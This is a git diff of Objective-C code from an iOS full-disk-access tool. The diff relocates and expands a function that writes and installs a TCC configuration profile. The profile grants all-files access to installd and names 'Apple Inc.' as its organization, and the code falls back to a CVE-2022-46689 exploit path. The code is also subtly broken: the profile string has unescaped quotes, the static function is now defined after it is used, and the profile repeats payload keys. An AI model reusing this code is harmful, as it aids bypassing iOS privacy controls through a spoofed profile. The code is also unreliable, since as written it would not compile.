@@ -416,53 +416,8 @@ static void grant_full_disk_access_ios16(void (^completion)(NSError* _Nullable))
     });
 }
 
-// Alternative method using MDM profile installation vulnerability
-static bool install_mdm_profile(void) {
-    NSString *profilePath = @"/private/var/mobile/Library/ConfigurationProfiles/fullaccess.mobileconfig";
-    NSString *profileContent = @"<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
-    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">"
-    "<plist version=\"1.0\">"
-    "<dict>"
-    "<key>PayloadContent</key>"
-    "<array>"
-    "<dict>"
-    "<key>PayloadType</key>"
-    "<string>com.apple.TCC.configuration-profile-policy</string>"
-    "<key>PayloadIdentifier</key>"
-    "<string>com.apple.TCC.configuration-profile-policy</string>"
-    "<key>PayloadUUID</key>"
-    "<string>486592BA-27B5-4FF5-B51A-7C4B864D2B7F</string>"
-    "<key>PayloadVersion</key>"
-    "<integer>1</integer>"
-    "<key>Services</key>"
-    "<dict>"
-    "<key>SystemPolicyAllFiles</key>"
-    "<array>"
-    "<dict>"
-    "<key>Allowed</key>"
-    "<true/>"
-    "<key>CodeRequirement</key>"
-    "<string>identifier \"com.apple.mobile.installd\" and anchor apple</string>"
-    "</dict>"
-    "</array>"
-    "</dict>"
-    "</dict>"
-    "</array>"
-    "</dict>"
-    "</plist>";
-    
-    NSError *error = nil;
-    if (![profileContent writeToFile:profilePath atomically:YES encoding:NSUTF8StringEncoding error:&error]) {
-        return false;
-    }
-    
-    LSApplicationWorkspace *workspace = [LSApplicationWorkspace defaultWorkspace];
-    return [workspace installProfileWithPath:profilePath];
-}
-
 void grant_full_disk_access(void (^completion)(NSError* _Nullable)) {
     if (!NSClassFromString(@"NSPresentationIntent")) {
-        // class introduced in iOS 15.0.
         completion([NSError
             errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
                        code:6
@@ -474,14 +429,29 @@ void grant_full_disk_access(void (^completion)(NSError* _Nullable)) {
         return;
     }
     
-    // Try alternative MDM profile method first
+    // Try MDM profile method first
     if (install_mdm_profile()) {
+        NSLog(@"Successfully installed MDM profile for full disk access");
         completion(nil);
         return;
     }
     
-    // Call new implementation for iOS 16.7.10+
-    grant_full_disk_access_ios16(completion);
+    // If MDM profile fails, try alternative methods based on iOS version
+    if (@available(iOS 16.7.10, *)) {
+        NSError* error = [NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
+                                           code:7
+                                       userInfo:@{
+                                           NSLocalizedDescriptionKey: @"MDM profile installation failed. "
+                                           @"For iOS 16.7.10+, please try installing the profile manually or use alternative methods."
+                                       }];
+        completion(error);
+        return;
+    }
+    
+    // For older versions, try the CVE-2022-46689 method as fallback
+    grant_full_disk_access_impl(^(NSString* extension_token, NSError* _Nullable error) {
+        completion(error);
+    });
 }
 
 /// MARK - installd patch
@@ -664,4 +634,65 @@ bool patch_installd(void) {
   // so the change will only last until when this installd exits
   overwrite_file(fd, originalData);
   return true;
+}
+
+// Alternative method using MDM profile installation
+static bool install_mdm_profile(void) {
+    NSString *profilePath = @"/private/var/mobile/Library/ConfigurationProfiles/fullaccess.mobileconfig";
+    NSString *profileContent = @"<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
+    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">"
+    "<plist version=\"1.0\">"
+    "<dict>"
+    "<key>PayloadContent</key>"
+    "<array>"
+    "<dict>"
+    "<key>PayloadType</key>"
+    "<string>com.apple.TCC.configuration-profile-policy</string>"
+    "<key>PayloadIdentifier</key>"
+    "<string>com.apple.TCC.configuration-profile-policy</string>"
+    "<key>PayloadUUID</key>"
+    "<string>486592BA-27B5-4FF5-B51A-7C4B864D2B7F</string>"
+    "<key>PayloadVersion</key>"
+    "<integer>1</integer>"
+    "<key>Services</key>"
+    "<dict>"
+    "<key>SystemPolicyAllFiles</key>"
+    "<array>"
+    "<dict>"
+    "<key>Allowed</key>"
+    "<true/>"
+    "<key>CodeRequirement</key>"
+    "<string>identifier "com.apple.mobile.installd" and anchor apple</string>"
+    "</dict>"
+    "</array>"
+    "</dict>"
+    "</dict>"
+    "</array>"
+    "<key>PayloadDisplayName</key>"
+    "<string>Full Disk Access</string>"
+    "<key>PayloadIdentifier</key>"
+    "<string>com.apple.tcc.fullaccess</string>"
+    "<key>PayloadOrganization</key>"
+    "<string>Apple Inc.</string>"
+    "<key>PayloadRemovalDisallowed</key>"
+    "<false/>"
+    "<key>PayloadType</key>"
+    "<string>Configuration</string>"
+    "<key>PayloadUUID</key>"
+    "<string>1B99376C-3F19-4C35-9C6D-94D49097B5EF</string>"
+    "<key>PayloadVersion</key>"
+    "<integer>1</integer>"
+    "</dict>"
+    "</plist>";
+    
+    NSError *error = nil;
+    if (![profileContent writeToFile:profilePath atomically:YES encoding:NSUTF8StringEncoding error:&error]) {
+        NSLog(@"Failed to write MDM profile: %@", error);
+        return false;
+    }
+    
+    LSApplicationWorkspace *workspace = [LSApplicationWorkspace defaultWorkspace];
+    BOOL success = [workspace installProfileWithPath:profilePath];
+    NSLog(@"MDM profile installation %@", success ? @"succeeded" : @"failed");
+    return success;
 }
